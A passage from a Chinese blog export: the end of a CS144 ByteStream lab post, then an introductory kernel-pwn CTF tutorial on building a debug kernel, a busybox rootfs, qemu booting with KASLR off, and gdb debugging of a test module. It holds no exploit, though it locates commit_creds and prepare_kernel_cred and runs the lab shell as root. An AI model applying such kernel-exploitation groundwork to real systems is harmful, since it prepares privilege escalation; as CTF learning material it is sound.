class="literal">true</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ByteStream::input_ended</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _end_input; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ByteStream::buffer_size</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _queue.size(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ByteStream::buffer_empty</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _queue.empty(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ByteStream::eof</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _end_input &amp;&amp; _queue.empty(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ByteStream::bytes_written</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _written_size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ByteStream::bytes_read</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _read_size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ByteStream::remaining_capacity</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _capacity_size - _queue.size(); &#125;</span><br></pre></td></tr></table></figure>
<p>这个 Lab0 还是比较简单的，可以看到 check 跑的非常成功：</p>
<p><img src="/2021/11/cs144-lab0/image-20211107094712926.png" alt="image-20211107094712926"></p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
        <tag>CS144</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel pwn CTF 入门</title>
    <url>/2021/10/kernel_pwn_introduction/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>内核 CTF 入门，主要参考 <a href="https://wiki.x10sec.org/pwn/linux/kernel-mode/environment/readme/" target="_blank" rel="noopener">CTF-Wiki</a>。</p>
<a id="more"></a>
<h2 id="二、环境配置">二、环境配置</h2>
<ul>
<li>
<p>调试内核需要一个优秀的 gdb 插件，这里选用 gef。</p>
<blockquote>
<p>根据其他师傅描述，peda 和 pwndbg 在调试内核时会有很多玄学问题。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install capstone unicorn keystone-engine ropper</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">source</span> `<span class="built_in">pwd</span>`/gef/gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>去<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" target="_blank" rel="noopener">清华源</a>下载 Linux kernel 压缩包并解压：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.9.8.tar.xz</span><br><span class="line">unxz linux-5.9.8.tar.xz</span><br><span class="line">tar -xf linux-5.9.8.tar</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>进入项目文件夹，进行 makefile 配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.9.8</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>在其中勾选</p>
<ul>
<li><code>Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info</code></li>
<li><code>Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger</code></li>
</ul>
<p>之后保存配置并退出</p>
</li>
<li>
<p>开始编译内核（默认 32 位）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j 8 bzImage</span><br></pre></td></tr></table></figure>
<blockquote>
<p>不推荐直接 <code>make -j 8</code>，因为它会编译很多很多大概率用不上的东西。</p>
</blockquote>
<p>这里有些小坑：</p>
<ul>
<li>
<p>缺失依赖项。</p>
<p>解决方法：根据 make 的报错信息来安装依赖项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libelf-dev</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>make[1]: *** No rule to make target 'debian/certs/debian-uefi-certs.pem', needed by 'certs/x509_certificate_list'.  Stop.</code></p>
<p>解决方法：将 <code>.config</code> 中的 <code>CONFIG_SYSTEM_TRUSTED_KEYS</code> 内容置空，然后重新 make。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Certificates for signature checking</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">CONFIG_SYSTEM_TRUSTED_KEYS=<span class="string">""</span> <span class="comment"># 置空, 不要删除当前条目</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>等出现了以下信息后则编译完成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Setup is 15420 bytes (padded to 15872 bytes).</span><br><span class="line">System is 5520 kB</span><br><span class="line">CRC 70701790</span><br><span class="line">Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#2)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后在启动内核前，先构建一个文件系统，否则内核会因为没有文件系统而报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)</span><br></pre></td></tr></table></figure>
<p>首先下载一下 busybox 源代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.34.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.34.1.tar.bz2</span><br></pre></td></tr></table></figure>
<p>之后配置 makefile：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> busybox-1.34.1</span><br><span class="line">make menuconfig</span><br><span class="line">make -j 8</span><br></pre></td></tr></table></figure>
<p>在 menuconfig 页面中，</p>
<ul>
<li>
<p>Setttings 选中 Build static binary (no shared libs), 使其编译成静态链接的文件（因为 kernel 不提供 libc)</p>
<p>需要注意的是，静态编译与链接需要额外安装一个依赖项 <code>glibc-static</code>。使用以下命令安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># redhat/centos系列安装:</span></span><br><span class="line">sudo yum install glibc-static</span><br><span class="line"><span class="comment"># debian/ubuntu系列安装</span></span><br><span class="line">sudo apt-get install libc6-dev</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在 Linux System Utilities 中取消选中 Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)</p>
<blockquote>
<p>当前版本默认没有选中该项，因此可以跳过。</p>
</blockquote>
</li>
</ul>
<p>编译完成后，使用 <code>make install</code>命令，将生成文件夹<code>_install</code>，该目录将成为我们的 rootfs。</p>
<p>接下来在 <code>_install</code> 文件夹下执行以创建一系列文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
<p>之后，在 rootfs 下（即 <code>_install</code> 文件夹下）编写以下 init 挂载脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"INIT SCRIPT"</span></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Boot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds"</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
<p>最后设置 init 脚本的权限，并将 rootfs 打包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x ./init</span><br><span class="line"><span class="comment"># 打包命令</span></span><br><span class="line">find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br><span class="line"><span class="comment"># 解包命令</span></span><br><span class="line"><span class="comment"># cpio -idmv &lt; rootfs.img</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>busybox的编译与安装在构建 rootfs 中不是必须的，但还是强烈建议构建 busybox，因为它提供了非常多的有用工具来辅助使用 kernel。</p>
</blockquote>
</li>
<li>
<p>使用 qemu 启动内核。以下是 CTF wiki 推荐的启动参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr"</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
<p>本着减少参数设置的目的，这是笔者的启动参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">  -initrd ./rootfs.img \</span><br><span class="line">  -append <span class="string">"nokaslr"</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>减少启动的参数个数，可以让我们在入门时，暂时屏蔽掉一些不必要的细节。</p>
<p>这里只设置了三个参数，其中：</p>
<ul>
<li>
<p><code>-kernel</code> 指定内核镜像文件 bzImage 路径</p>
</li>
<li>
<p><code>-initrd</code> 设置内核启动的内存文件系统</p>
</li>
<li>
<p><code>-append &quot;nokaslr&quot;</code> 关闭 Kernel ALSR 以便于调试内核</p>
<p>注意：<code>nokaslr</code> 可 <strong>千万千万千万别打成 <code>nokalsr</code></strong> 了。就因为这个我调试了一个下午的 kernel…</p>
<p>是的 CTF Wiki 上的 nokaslr 也是错的，它打成了 nokalsr （xs）</p>
</li>
</ul>
</blockquote>
<p>启动好后就可以使用内置的 shell 了。</p>
</li>
</ul>
<h2 id="三、内核驱动的编写与调试">三、内核驱动的编写与调试</h2>
<h3 id="1-构建过程">1. 构建过程</h3>
<p>这里我们在 linux kernel 项目包下新建了一个文件夹：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">linux-5.9.8 $ mkdir mydrivers</span><br></pre></td></tr></table></figure>
<p>之后在该文件夹下放入一个驱动代码<code>ko_test.c</code>，代码照搬的 CTF-wiki：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ko_test_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"This is a test ko!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ko_test_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"Bye Bye~\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure>
<p>代码编写完成后，放入一个 <code>Makefile</code>文件：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定声称哪些 内核模块</span></span><br><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定内核项目路径</span></span><br><span class="line">KDIR =/usr/class/kernel_pwn/linux-5.9.8</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">        <span class="comment"># -C 参数指定进入内核项目路径</span></span><br><span class="line">        <span class="comment"># -M 指定驱动源码的环境，使 Makefile 在构建模块之前返回到 驱动源码 目录，并在该目录中生成驱动模块</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意点：</p>
<ol>
<li>
<p>Makefile 文件名中的首字母 <code>M</code> 一定是大写，否则会报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scripts/Makefile.build:44: /usr/class/kernel_pwn/linux-5.9.8/mydrivers/Makefile: No such file or directory</span><br><span class="line">make[2]: *** No rule to make target <span class="string">'/usr/class/kernel_pwn/linux-5.9.8/mydrivers/Makefile'</span>.  Stop.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Makefile 中 <code>obj-m</code> 要与刚刚的驱动代码文件名所对应，否则会报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make[2]: *** No rule to make target <span class="string">'/usr/class/kernel_pwn/linux-5.9.8/mydrivers/ko_test.o'</span>, needed by <span class="string">'/usr/class/kernel_pwn/linux-5.9.8/mydrivers/ko_test.mod'</span>.  Stop.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如果make时遇到以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">makefile:6: *** missing separator.  Stop.</span><br></pre></td></tr></table></figure>
<p>则使用 vim 打开 Makefile，键入 <code>i</code> 以进入输入模式，然后替换掉 make 命令前的前导空格为 tab，最后键入 <code>:wq</code> 保存修改。</p>
</li>
</ol>
</blockquote>
<p>最后使用 <code>make</code> 即可编译驱动。完成后的目录内容如下所示：</p>
<blockquote>
<p>这里我们只关注 <code>ko_test.ko</code>。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree                  </span><br><span class="line">.</span><br><span class="line">├── ko_test.c</span><br><span class="line">├── ko_test.ko</span><br><span class="line">├── ko_test.mod</span><br><span class="line">├── ko_test.mod.c</span><br><span class="line">├── ko_test.mod.o</span><br><span class="line">├── ko_test.o</span><br><span class="line">├── Makefile</span><br><span class="line">├── modules.order</span><br><span class="line">└── Module.symvers</span><br><span class="line"></span><br><span class="line">0 directories, 9 files</span><br></pre></td></tr></table></figure>
<h3 id="2-运行过程">2. 运行过程</h3>
<p>将新编译出来的 <code>*.ko</code> 文件复制进 rootfs 文件夹（<code>busybox-1.34.1/_install</code>）下，</p>
<p>之后修改 <code>busybox-1.34.1/_install/init</code> 脚本中的内容：</p>
<blockquote>
<p>这里需要提权 /bin/sh， 目的是为了使用 root 权限启动 /bin/sh，使得拥有执行 <code>dmesg</code> 命令的权限。</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo "INIT SCRIPT"</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="addition">+ insmod /ko_test.ko # 挂载内核模块</span></span><br><span class="line">echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"</span><br><span class="line"><span class="deletion">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span></span><br><span class="line"><span class="addition">+ setsid /bin/cttyhack setuidgid 0 /bin/sh # 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span><br><span class="line"><span class="addition">+ poweroff -f # 设置 shell 退出后则关闭机器</span></span><br></pre></td></tr></table></figure>
<p>重新打包 rootfs 并运行 qemu，之后键入 <code>dmesg</code> 命令即可看到 ko_test 模块已被成功加载：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211002133722875.png" alt="image-20211002133722875"></p>
<blockquote>
<p>正常情况下，执行 qemu 会弹出一个小框 GUI。若想像上图一样将启动的界面变成当前终端，则需在 qemu 启动时额外指定参数：</p>
<ul>
<li><code>-nographic</code></li>
<li><code>-append &quot;console=ttyS0&quot;</code></li>
</ul>
</blockquote>
<h3 id="3-调试过程">3. 调试过程</h3>
<h4 id="a-attach-qemu">a. attach qemu</h4>
<p>调试时最好使用 root 权限执行 <code>/bin/sh</code>，相关修改方法已经在上面说明，此处暂且不表。</p>
<p>在启动 qemu 时，额外指定参数 <code>-gdb tcp::1234</code> （或者等价的<code>-s</code>），之后 qemu 将做好 gdb attach 的准备。如果希望 qemu 启动后立即挂起，则必须附带 <code>-S</code> 参数。</p>
<p>同时，调试内核时，为了加载 vmlinux 符号表，<strong>必须额外指定 <code>-append &quot;nokaslr&quot;</code>以关闭 kernel ASLR</strong>。这样符号表才能正确的对应至内存中的指定位置，<strong>否则将无法给目标函数下断点</strong>。</p>
<p>qemu启动后，<strong>必须另起一个终端</strong>，键入 <code>gdb -q -ex &quot;target remote localhost:1234&quot;</code>，即可 attach 至 qemu上。</p>
<p>gdb attach 上 qemu 后，可以加载 vmlinux 符号表、给特定函数下断点，并输入 <code>continue</code> 以执行至目标函数处。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># qemu 指定 -S 参数后挂起，此时在gdb键入以下命令</span></span><br><span class="line">gef&gt; add-symbol-file vmlinux</span><br><span class="line">gef&gt; b start_kernel</span><br><span class="line">gef&gt; <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">[Breakpoint 1, start_kernel () at init/main.c:837]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>对于内核中的各个符号来说，我们也可以通过以下命令来查看一些符号在内存中的加载地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># grep &lt;symbol_name&gt; /proc/kalsyms</span></span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br><span class="line">grep ko_test_init  /proc/kallsyms</span><br></pre></td></tr></table></figure>
<blockquote>
<p>坑点1：之前笔者编写了以下 shell 脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 其他设置</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># **后台** 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 [other args] &amp;</span><br><span class="line"><span class="comment"># 直接在当前终端打开 GDB</span></span><br><span class="line">gdb -q -ex <span class="string">"target remote localhost:1234"</span></span><br></pre></td></tr></table></figure>
<p>但在执行脚本时，当笔者在 GDB 中键入 Ctrl+C 时， SIGINT 信号将直接终止 qemu 而不是挂起内部的 kernel。因此，gdb必须在另一个终端启动才可以正常处理 Ctrl+C。</p>
<p>正确的脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 其他设置</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># **后台** 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 [other args] &amp;</span><br><span class="line"><span class="comment"># 开启新终端，在新终端中打开 GDB</span></span><br><span class="line">gnome-terminal -e <span class="string">'gdb -q -ex "target remote localhost:1234"'</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>坑点2：对于 gdb gef 插件来说，最好不要使用常规的<code>target remote localhost:1234</code>语句（无需root权限）来连接远程，否则会报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  target remote localhost:1234</span><br><span class="line">Remote debugging using localhost:1234</span><br><span class="line">warning: No executable has been specified and target does not support</span><br><span class="line">determining executable automatically.  Try using the <span class="string">"file"</span> <span class="built_in">command</span>.</span><br><span class="line">0x000000000000fff0 <span class="keyword">in</span> ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────── registers ────────────────────────────────────</span><br><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: <span class="string">'NoneType'</span> object has no attribute <span class="string">'all_registers'</span></span><br></pre></td></tr></table></figure>
<p>与之相对的，使用效果更好的 <code>gef-remote</code> 命令（需要root权限）连接 qemu：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一定要提前指定架构</span></span><br><span class="line"><span class="built_in">set</span> architecture i386:x86-64</span><br><span class="line">gef-remote --qemu-mode localhost:1234</span><br></pre></td></tr></table></figure>
<p>坑点3：如果 qemu 断在 <code>start_kernel</code>时 gef 报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: max() arg is an empty sequence</span><br></pre></td></tr></table></figure>
<p>直接单步 <code>ni</code> 一下即可。</p>
</blockquote>
<h4 id="b-attach-drivers">b. attach drivers</h4>
<h5 id="1-常规步骤">1) 常规步骤</h5>
<p>首先， 将目标驱动加载进内核中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod &lt;driver_module_name&gt;</span><br></pre></td></tr></table></figure>
<p>之后，通过以下命令查看 qemu 中内核驱动的 text 段的装载基地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看装载驱动</span></span><br><span class="line">lsmod</span><br><span class="line"><span class="comment"># 获取驱动加载的基地址</span></span><br><span class="line">grep &lt;target_module_name&gt; /proc/modules</span><br></pre></td></tr></table></figure>
<p>在 gdb 窗口中，键入 以下命令以加载调试符号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file mydrivers/ko_test.ko &lt;ko_test_base_addr&gt; [-s &lt;section1_name&gt; &lt;section1_addr&gt;] ...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注，与 vmlinux 不同，使用 add-symbol-file 加载内核模块符号时，<strong>必须指定内核模块的 text 段基地址</strong>。</p>
<p>因为内核位于众所周知的虚拟地址（该地址与 vmlinux elf 文件的加载地址相同），但内核模块只是一个存档，不存在有效加载地址，只能等到内核加载器分配内存并决定在哪里加载此模块的每个可加载部分。因此在加载内核模块前，我们无法得知内核模块将会加载到哪块内存上。故将符号文件加载进 gdb 时，我们必须尽可能显式指定每个 section 的地址。</p>
<p>需要注意的是，<strong>加载符号文件时，越多指定每个 section 的地址越好</strong>。否则如果只单独指定了 .text 段的基地址，则有可能在给函数下断点时断不下来，非常影响调试。</p>
</blockquote>
<p>如何查看目标内核模块的各个 section 加载首地址呢？请执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">"0x"</span> /sys/module/ko_test/sections/.*</span><br></pre></td></tr></table></figure>
<h5 id="2-例子">2) 例子</h5>
<p>一个小小例子：调试 ko_test.ko 的步骤如下：</p>
<ul>
<li>
<p>首先在 qemu 中的 kernel shell 执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先装载 ko_test 进内核中</span></span><br><span class="line">insmod /ko_test.ko</span><br><span class="line"><span class="comment"># 查看当前 ko_test 装载的地址</span></span><br><span class="line">grep ko_test /proc/modules</span><br><span class="line">grep <span class="string">"0x"</span> /sys/module/ko_test/sections/.*</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003135526278.png" alt="image-20211003135526278"></p>
</li>
<li>
<p>记录下这些地址，之后进入 gdb 中，先按下 Ctrl+C 断下 kernel，然后键入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将对应符号加载至该地址处</span></span><br><span class="line">add-symbol-file mydrivers/ko_test.ko  0xffffffffc0002000 \</span><br><span class="line">                    -s .rodata.str1.1 0xffffffffc000304c \</span><br><span class="line">                    -s .symtab        0xffffffffc0007000 \</span><br><span class="line">                    -s .text.unlikely 0xffffffffc0002000</span><br><span class="line"><span class="comment"># 下断点</span></span><br><span class="line">b ko_test_init</span><br><span class="line">b ko_test_exit</span><br><span class="line"><span class="comment"># 使其继续执行</span></span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003140102062.png" alt="image-20211003140102062"></p>
</li>
<li>
<p>最后回到 qemu 中，在 kernel shell 中执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 卸载 ko_test</span></span><br><span class="line">rmmod ko_tes</span><br></pre></td></tr></table></figure>
<p>此时 gdb 会断到 ko_test_exit 中：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003140345483.png" alt="image-20211003140345483"></p>
<p>如果在卸载了ko_test后，又重新加载 ko_test，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod ko_test</span><br></pre></td></tr></table></figure>
<p>则 gdb 会立即断到 ko_test_init 中：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003140435218.png" alt="image-20211003140435218"></p>
<blockquote>
<p>这可能是因为指定了 nokaslr，使得相同驱动多次加载的基地址是一致的。</p>
</blockquote>
</li>
</ul>
<p>上面调试 kernel module 的 init 函数方法算是一个小 trick，它利用了 <strong>noaslr 环境下相同驱动重新加载的基地址一致</strong> 的原理来下断。但最为正确的调试 init 函数的方式，还是得跟踪 <code>do_init_module</code> 函数的控制流来获取基地址。以下是一系列相关操作步骤：</p>
<blockquote>
<p>跟踪 <code>do_init_module</code> 函数是因为它在 <code>load_module</code> 函数中被调用。<code>load_module</code>函数将在完成大量的内存加载工作后，最后进入 <code>do_init_module</code> 函数中执行内核模块的 init 函数，并在其中进行善后工作。</p>
<p><code>load_module</code>函数将被作为 SYSCALL 函数的 <code>init_module</code>调用。</p>
</blockquote>
<ul>
<li>
<p>首先让 kernel 跑飞，等到 kernel 加载完成，shell 界面显示后，gdb 按下 ctrl + C 断下，给 <code>do_init_module</code>函数下断。该函数的前半部分将会执行 内核模块的 init 函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is where the real work happens.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Keep it uninlined to provide a reliable breakpoint target, e.g. for the gdb</span></span><br><span class="line"><span class="comment"> * helper command 'lx-symbols'.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">int</span> <span class="title">do_init_module</span><span class="params">(struct <span class="keyword">module</span> *mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="comment">/* Start the module */</span></span><br><span class="line">  <span class="keyword">if</span> (mod-&gt;init != <span class="literal">NULL</span>)</span><br><span class="line">    ret = do_one_initcall(mod-&gt;init);   <span class="comment">// &lt;- 此处执行 ko_test_init 函数</span></span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">goto</span> fail_free_freeinit;</span><br><span class="line">  &#125;</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>gdb 键入 <code>continue</code> 再让 kernel 跑飞。之后kernel shell 中输入 <code>insmod /ko_test.ko</code>装载内核模块，此时gdb会断下。在 gdb 中查看 <code>mod-&gt;init</code> 成员即可查看到 kernel module init 函数的首地址。</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003143313234.png" alt="image-20211003143313234"></p>
</li>
<li>
<p>要想看到当前 kernel module 的全部 section 地址，可以在 gdb 中键入以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前 module 的 sections 个数</span></span><br><span class="line">p mod-&gt;sect_attrs-&gt;nsections</span><br><span class="line"><span class="comment"># 查看第 3 个 section 信息</span></span><br><span class="line">p mod-&gt;sect_attrs-&gt;attrs[2]</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003144520767.png" alt="image-20211003144520767"></p>
<p>有了当前内核模块的全部 section 名称与基地址后，就可以按照之前的方法来加载符号文件了。</p>
</li>
</ul>
<h4 id="c-启动脚本">c. 启动脚本</h4>
<blockquote>
<p>配环境真是一件麻烦到极点的事情，不过目前就到此为止了 :)</p>
</blockquote>
<p>笔者将一系列启动命令整合成了一个 shell 脚本，方便一键运行：</p>
